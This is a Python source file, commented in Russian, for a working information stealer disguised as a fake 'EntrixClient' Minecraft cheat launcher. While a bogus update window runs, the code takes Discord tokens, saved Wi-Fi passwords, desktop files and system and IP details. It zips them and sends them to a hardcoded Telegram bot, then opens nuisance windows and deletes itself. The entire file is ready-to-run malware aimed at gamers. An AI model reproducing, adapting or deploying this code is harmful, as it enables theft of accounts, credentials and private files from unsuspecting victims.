import os
import json
import sqlite3
import shutil
import requests
import base64
import platform
import getpass
import re
import subprocess
import tempfile
import threading
import time
import random
import ctypes
import sys
from datetime import datetime
import tkinter as tk
from tkinter import ttk

# ===== НАСТРОЙКА ДЛЯ ANDROID =====
# Создаем папку для временных файлов
TEMP_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp")
if not os.path.exists(TEMP_DIR):
    os.makedirs(TEMP_DIR)

# ===== ТВОИ ДАННЫЕ =====
BOT_TOKEN = "8533094049:AAH5x8O0SLV2qNDsfiK3hE2QeGsVKpfLies"
CHAT_ID = "5671755030"

# ===== ОПРЕДЕЛЕНИЕ ЖЕРТВЫ =====
def get_victim_info():
    """Собирает информацию о пользователе"""
    try:
        username = getpass.getuser()
    except:
        username = "Неизвестно"
    
    try:
        computer = platform.node()
    except:
        computer = "Неизвестно"
    
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
    except:
        ip = "Неизвестно"
    
    info = f"""
🔥 **EntrixClient - Отчет**
━━━━━━━━━━━━━━━━━━━━━━
👤 Пользователь: {username}
💻 Компьютер: {computer}
🌍 IP: {ip}
🕒 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """
    return info

# ===== ОТПРАВКА В TELEGRAM =====
def send_to_telegram(file_path, caption=""):
    """Отправляет файл в Telegram"""
    try:
        victim_info = get_victim_info()
        full_caption = f"{victim_info}\n{caption}"
        
        with open(file_path, 'rb') as f:
            files = {'document': (os.path.basename(file_path), f)}
            data = {'chat_id': CHAT_ID, 'caption': full_caption[:1024]}
            requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument',
                files=files,
                data=data,
                timeout=30
            )
        return True
    except:
        return False

def send_message(text):
    """Отправляет текст"""
    try:
        data = {'chat_id': CHAT_ID, 'text': text[:4096]}
        requests.post(
            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
            data=data,
            timeout=30
        )
    except:
        pass

# ===== 1. КРАЖА ТОКЕНОВ DISCORD =====
def steal_discord_tokens():
    """Собирает Discord токены"""
    tokens = []
    token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
    
    discord_paths = [
        os.path.expanduser('~') + '/AppData/Roaming/discord/Local Storage/leveldb/',
        os.path.expanduser('~') + '/AppData/Roaming/discordptb/Local Storage/leveldb/',
        os.path.expanduser('~') + '/AppData/Roaming/discordcanary/Local Storage/leveldb/',
    ]
    
    for path in discord_paths:
        if os.path.exists(path):
            try:
                for file_name in os.listdir(path):
                    if file_name.endswith(('.log', '.ldb', '.db')):
                        with open(os.path.join(path, file_name), 'r', errors='ignore') as f:
                            content = f.read()
                            tokens.extend(token_pattern.findall(content))
            except:
                continue
    
    return list(set(tokens))

# ===== 2. Wi-Fi ПАРОЛИ =====
def steal_wifi_passwords():
    """Крадет пароли от Wi-Fi"""
    wifi_data = []
    
    if platform.system() == 'Windows':
        try:
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp866', errors='ignore').split('\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "Все профили пользователей" in i or "All User Profile" in i]
            
            for profile in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('cp866', errors='ignore').split('\n')
                    password_lines = [i.split(":")[1][1:-1] for i in results if "Содержимое ключа" in i or "Key Content" in i]
                    password = password_lines[0] if password_lines else None
                    
                    wifi_data.append({
                        'ssid': profile,
                        'password': password
                    })
                except:
                    continue
        except:
            pass
    
    return wifi_data

# ===== 3. ФАЙЛЫ С РАБОЧЕГО СТОЛА =====
def steal_desktop_files():
    """Копирует файлы с рабочего стола"""
    desktop = os.path.expanduser('~') + '/Desktop/'
    
    if os.path.exists(desktop):
        temp_dir = tempfile.mkdtemp()
        files_copied = 0
        
        for file in os.listdir(desktop):
            if files_copied >= 20:
                break
                
            if file.endswith(('.txt', '.doc', '.docx', '.xls', '.xlsx', '.pdf', '.jpg', '.png')):
                try:
                    src = os.path.join(desktop, file)
                    dst = os.path.join(temp_dir, file)
                    shutil.copy2(src, dst)
                    files_copied += 1
                except:
                    continue
        
        if files_copied > 0:
            zip_path = os.path.join(temp_dir, 'desktop_files.zip')
            shutil.make_archive(zip_path.replace('.zip', ''), 'zip', temp_dir)
            return zip_path
    
    return None

# ===== 4. СИСТЕМНАЯ ИНФОРМАЦИЯ =====
def collect_system_info():
    """Собирает информацию о системе в файл"""
    info = get_victim_info()
    
    info += f"\n📊 Процессор: {platform.processor()}"
    info += f"\n💾 Версия: {platform.version()}"
    
    temp_dir = tempfile.mkdtemp()
    info_path = os.path.join(temp_dir, 'system_info.txt')
    
    with open(info_path, 'w', encoding='utf-8') as f:
        f.write(info)
    
    return info_path, temp_dir

# ===== ХАОС: РАДУЖНЫЙ ЭКРАН =====
def rainbow_chaos():
    """Устраивает визуальный хаос на рабочем столе"""
    try:
        # Меняем обои несколько раз
        SPI_SETDESKWALLPAPER = 20
        wallpaper_dir = os.path.expandvars(r"%SystemRoot%\Web\Wallpaper\Windows")
        
        if os.path.exists(wallpaper_dir):
            wallpapers = [f for f in os.listdir(wallpaper_dir) if f.endswith(('.jpg', '.img', '.png'))]
            if wallpapers:
                for i in range(3):
                    random_wallpaper = os.path.join(wallpaper_dir, random.choice(wallpapers))
                    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, random_wallpaper, 3)
                    time.sleep(1)
        
        # Открываем много окон калькулятора
        for i in range(5):
            subprocess.Popen('calc.exe', shell=True)
            time.sleep(0.5)
        
    except Exception as e:
        print(f"Ошибка хаоса: {e}")

# ===== САМОУНИЧТОЖЕНИЕ =====
def self_destruct():
    """Удаляет сам себя через некоторое время"""
    try:
        exe_path = sys.argv[0]
        if os.path.exists(exe_path):
            bat_path = os.path.join(os.environ['TEMP'], 'cleaner.bat')
            with open(bat_path, 'w') as f:
                f.write('@echo off\n')
                f.write('timeout /t 3 /nobreak > nul\n')
                f.write(f'del /f /q "{exe_path}"\n')
                f.write('del /f /q "%~f0"\n')
            os.startfile(bat_path)
    except:
        pass

# ===== ГЛАВНЫЙ СТИЛЛЕР =====
def run_stealer():
    """Запускает сбор всех данных"""
    try:
        send_message("🚀 EntrixClient запущен на целевой машине!")
        
        # Собираем системную информацию
        info_path, temp_dir1 = collect_system_info()
        
        # Создаем общую папку
        main_temp = os.path.join(TEMP_DIR, f"main_{random.randint(1000,9999)}")
        os.makedirs(main_temp, exist_ok=True)
        
        # Копируем системную инфу
        shutil.copy(info_path, os.path.join(main_temp, 'system_info.txt'))
        shutil.rmtree(temp_dir1, ignore_errors=True)
        
        # Discord токены
        discord_tokens = steal_discord_tokens()
        if discord_tokens:
            with open(os.path.join(main_temp, 'discord_tokens.txt'), 'w') as f:
                for token in discord_tokens:
                    f.write(token + '\n')
        
        # Wi-Fi пароли
        wifi = steal_wifi_passwords()
        if wifi:
            with open(os.path.join(main_temp, 'wifi.json'), 'w') as f:
                json.dump(wifi, f, indent=2)
        
        # Файлы с рабочего стола
        desktop_zip = steal_desktop_files()
        if desktop_zip and os.path.exists(desktop_zip):
            shutil.copy(desktop_zip, os.path.join(main_temp, 'desktop.zip'))
        
        # Упаковываем всё в архив
        final_zip = os.path.join(TEMP_DIR, 'entrix_data.zip')
        shutil.make_archive(final_zip.replace('.zip', ''), 'zip', main_temp)
        
        # Отправляем
        send_to_telegram(final_zip, "📦 Данные жертвы")
        
        # Чистим за собой
        shutil.rmtree(main_temp, ignore_errors=True)
        if os.path.exists(final_zip):
            os.remove(final_zip)
        if desktop_zip and os.path.exists(desktop_zip):
            os.remove(desktop_zip)
        
    except Exception as e:
        send_message(f"❌ Ошибка: {str(e)}")

# ===== ФЕЙКОВЫЙ ЛАУНЧЕР ENTRIXCLIENT =====
class EntrixLauncher:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("EntrixClient 1.1 beta")
        self.root.geometry("500x320")
        self.root.resizable(False, False)
        
        # Пытаемся установить иконку если есть
        try:
            self.root.iconbitmap("entrix.ico")
        except:
            pass
        
        # Заголовок
        title = tk.Label(self.root, text="EntrixClient 1.1 beta", 
                        font=("Minecraft", 18, "bold"), fg="#00AA00")
        title.pack(pady=15)
        
        # Подзаголовок
        subtitle = tk.Label(self.root, text="Minecraft 1.16.5 | PvP Client", 
                           font=("Arial", 10), fg="#555")
        subtitle.pack(pady=5)
        
        # Версия
        version_frame = tk.Frame(self.root)
        version_frame.pack(pady=10)
        
        tk.Label(version_frame, text="Текущая версия: 1.0.8", font=("Arial", 9)).pack(side=tk.LEFT, padx=5)
        tk.Label(version_frame, text="→", font=("Arial", 12)).pack(side=tk.LEFT, padx=5)
        tk.Label(version_frame, text="1.1.0 beta", font=("Arial", 9, "bold"), fg="green").pack(side=tk.LEFT, padx=5)
        
        # Статус
        self.status = tk.Label(self.root, text="Подготовка к обновлению...", 
                              font=("Arial", 10), fg="#666")
        self.status.pack(pady=10)
        
        # Прогресс-бар
        self.progress = ttk.Progressbar(self.root, length=400, mode='determinate')
        self.progress.pack(pady=10)
        
        # Детали
        self.details = tk.Label(self.root, text="", font=("Arial", 9), fg="#888")
        self.details.pack(pady=5)
        
        # Кнопка
        self.button = tk.Button(self.root, text="Отмена", state="disabled", 
                               width=20, height=2)
        self.button.pack(pady=15)
        
        # Запускаем фейковое обновление
        self.update_thread = threading.Thread(target=self.run_fake_update)
        self.update_thread.daemon = True
        self.update_thread.start()
    
    def run_fake_update(self):
        """Имитация процесса обновления"""
        stages = [
            (0, "Подключение к серверу..."),
            (10, "Проверка целостности файлов..."),
            (25, "Загрузка модулей (1/5)..."),
            (40, "Загрузка модулей (2/5)..."),
            (55, "Установка Minecraft HUD..."),
            (70, "Обновление KillAura..."),
            (85, "Компиляция ресурсов..."),
            (95, "Финальная проверка..."),
            (100, "Готово!")
        ]
        
        for progress, status in stages:
            self.root.after(0, lambda p=progress, s=status: self.update_ui(p, s))
            time.sleep(random.uniform(1, 1.5))
        
        self.root.after(0, self.enable_button)
    
    def update_ui(self, progress, status):
        """Обновляет интерфейс"""
        self.progress['value'] = progress
        self.status.config(text=status)
        
        # Рандомные файлы для правдоподобия
        if progress < 85:
            files = ["killaura.dll", "aimbot.dll", "reach.dll", "esp.dll", "config.cfg"]
            self.details.config(text=f"Обработка: {random.choice(files)}")
    
    def enable_button(self):
        """Активирует кнопку"""
        self.button.config(text="Запустить EntrixClient", state="normal", 
                          command=self.launch_game, bg="#00AA00", fg="white")
        self.status.config(text="Обновление завершено! Нажмите для запуска.", fg="green")
    
    def launch_game(self):
        """Закрывает окно"""
        self.root.destroy()
    
    def run(self):
        """Запускает окно"""
        self.root.mainloop()

# ===== ЗАПУСК =====
if __name__ == "__main__":
    # Запускаем стиллер в фоне
    stealer_thread = threading.Thread(target=run_stealer)
    stealer_thread.daemon = True
    stealer_thread.start()
    
    # Даем стиллеру время начать работу
    time.sleep(2)
    
    # Запускаем хаос в отдельном потоке (опционально)
    chaos_thread = threading.Thread(target=rainbow_chaos)
    chaos_thread.daemon = True
    chaos_thread.start()
    
    # Показываем фейковый лаунчер EntrixClient
    launcher = EntrixLauncher()
    launcher.run()
    
    # После закрытия лаунчера запускаем самоуничтожение
    time.sleep(2)
    self_destruct()